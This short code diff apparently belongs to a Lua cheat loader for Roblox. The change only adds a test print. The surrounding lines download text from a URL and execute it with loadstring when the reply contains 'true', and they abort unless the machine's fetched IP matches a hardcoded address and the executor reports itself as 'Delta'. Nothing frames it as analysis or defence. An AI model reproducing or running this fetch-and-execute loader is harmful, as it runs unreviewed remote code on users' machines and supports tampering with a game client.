@@ -7,3 +7,5 @@ local r=game:HttpGet(u,true)
 if r and r:find("true")then loadstring(r)()return end
 if pcall(game.HttpGet,game,i)then local _,ip=pcall(game.HttpGet,game,i)if ip~="186.57.238.57"then return end end
 if identifyexecutor then if identifyexecutor()~="Delta"then return end end
+
+print'test'
